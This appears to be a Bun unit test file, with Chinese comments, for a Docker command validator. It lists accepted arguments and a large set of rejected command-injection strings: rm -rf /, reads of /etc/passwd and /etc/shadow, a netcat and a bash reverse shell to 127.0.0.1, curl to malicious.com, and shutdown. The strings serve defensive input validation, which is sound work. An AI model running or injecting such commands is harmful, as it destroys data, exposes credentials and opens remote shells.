import { test, expect, describe } from 'bun:test';
import { dockerCmdValidator } from '../src/docker-cmd-validator';

describe('dockerCmdValidator', () => {
  // 合法输入测试
  test('should pass for valid docker commands', () => {
    const validInputs = [
      '--foo=bar xyz',
      'ubuntu',
      'ghcr.io/xxx/xxx',
      '--sse-port 3000 --sse-host 0.0.0.0 PATH',
      'docker/ubuntu:latest',
      'my-app:1.0.0/path/to/app --env=prod',
      '  ubuntu  ', // 带有前后空格的情况
      '--name_dog', // 允许下划线
      'abc-123_DEF./:= xyz',
    ];

    validInputs.forEach((input) => {
      expect(() => dockerCmdValidator(input)).not.toThrow();
    });
  });

  // 非法输入测试：包含危险字符或者不允许的符号
  test('should throw error for docker commands containing dangerous characters', () => {
    const invalidInputs = [
      '--sse-port 3000 --sse-host 0.0.0.0 PATH -- npx -y @modelcontextprotocol/server-puppeteer',
      '&& aaa',
      '&',
      '|',
      '|| aaa',
      '& aaa',
      '&&Dog',
      '$',
      '$ aaa',
      '$$ aaa',
      ';',
      '@ ',
      '@',
      '| aaa',
      "'",
      '"',
      '`',
      '$DOG',
      'echo $PATH',
      '{',
      '}',
      '(',
      ')',
      '[',
      ']',
      '`',
      '~',
      '\t',
      '\\t',
      '\\\t',
      '\n',
      '\\n',
      '\\\n',
      '\n rm -rf /', // 换行后跟危险命令
      '!',
      '#',
      '\\ aaaa',
      '> aaaa',
      '< aaaa',
      'ubuntu && rm -rf /',
      'ubuntu||echo test',
      'ubuntu; rm -rf /',
      'ubuntu | grep something',
      'ubuntu `rm -rf /`',
      'ubuntu (rm -rf /)',
      'ubuntu )',
      'ubuntu > /dev/null',
      'ubuntu < /etc/passwd',
      'ubuntu,rm,rf,/', // 包含逗号也不允许
      '$(rm -rf /)',
      '`cat /etc/passwd`',
      '$(echo hacked)',
      ';shutdown -h now',
      'ls; rm -rf /',
      '|| sleep 10',
      '| nc -e /bin/sh 127.0.0.1 4444',
      '$(curl http://malicious.com)',
      '"$(reboot)"',
      '$(eval echo hacked)',
      '$(printf %s "hacked")',
      '$(cat /proc/self/environ)',
      '$(ls -la)',
      '$(id)',
      'rm ',
      '$(touch /tmp/pwned)',
      '$(perl -e "system(\'rm -rf /\')" )',
      '`shutdown now`',
      '$(nc -l -p 1234 -e /bin/bash)',
      '$(bash -i >& /dev/tcp/127.0.0.1/4444 0>&1)',
      '"; sleep 10; echo "',
      '$(rm -rf /) && echo safe',
      '$(cat /etc/shadow)',
      '$(echo $(rm -rf /))',
    ];

    invalidInputs.forEach((input) => {
      expect(() => dockerCmdValidator(input)).toThrow('Docker CMD is invalid');
    });
  });

  test('should throw error for empty string', () => {
    expect(() => dockerCmdValidator('')).not.toThrow();
    expect(() => dockerCmdValidator('0')).not.toThrow();
  });
});
